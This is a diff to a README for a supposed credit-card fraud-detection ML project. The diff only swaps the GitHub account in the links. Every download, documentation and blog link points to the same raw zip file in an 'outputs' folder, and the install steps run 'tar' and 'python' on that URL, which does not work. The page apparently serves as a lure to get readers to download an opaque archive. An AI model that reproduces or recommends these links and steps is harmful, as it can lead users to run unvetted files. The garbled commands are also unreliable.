@@ -1,7 +1,7 @@
 # 💳 credit-card-fraud-project - Detect Fraud with Ease
 
 ## 📦 Download Now
-[![Download](https://github.com/TanchingonYT/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip%20release-brightgreen)](https://github.com/TanchingonYT/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip)
+[![Download](https://github.com/arychow/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip%20release-brightgreen)](https://github.com/arychow/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip)
 
 ## 📖 Project Description
 The credit-card-fraud-project is a complete machine learning pipeline designed to help identify credit card fraud. This tool includes features like data cleaning, feature engineering, model comparison, evaluation, SHAP explainability, and the ability to create custom simulation scenarios. This project is suitable for anyone interested in understanding fraud detection using machine learning techniques.
@@ -16,7 +16,7 @@ Before downloading, ensure your computer meets the following requirements:
 - Disk Space: At least 200MB of free space
 
 ### 2. Download & Install
-To download the application, visit this page: [Download Page](https://github.com/TanchingonYT/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip).
+To download the application, visit this page: [Download Page](https://github.com/arychow/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -45,7 +45,7 @@ Once you have downloaded the file:
    ```
 3. Extract the downloaded archive with the command:
    ```bash
-   tar -xvzf https://github.com/TanchingonYT/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip
+   tar -xvzf https://github.com/arychow/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip
    ```
 4. Navigate to the extracted folder:
    ```bash
@@ -53,7 +53,7 @@ Once you have downloaded the file:
    ```
 5. Run the application with:
    ```bash
-   python https://github.com/TanchingonYT/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip
+   python https://github.com/arychow/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip
    ```
 
 ### 4. Application Features
@@ -74,8 +74,8 @@ For more detailed guidance on the project and its features, refer to our documen
 Join our community on GitHub Discussions. Share your thoughts, ask questions, or simply connect with others interested in fraud detection and machine learning. 
 
 ### 7. Additional Resources
-- [Documentation](https://github.com/TanchingonYT/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip) - Find guides and tutorials.
-- [Blog](https://github.com/TanchingonYT/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip) - Read articles on machine learning and fraud detection.
+- [Documentation](https://github.com/arychow/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip) - Find guides and tutorials.
+- [Blog](https://github.com/arychow/credit-card-fraud-project/raw/refs/heads/main/outputs/card_fraud_project_credit_2.9.zip) - Read articles on machine learning and fraud detection.
 
 ## 🦺 Security Notice
 Ensure that you downloaded the application from the official GitHub Releases page to avoid security risks. Always keep your software up to date.
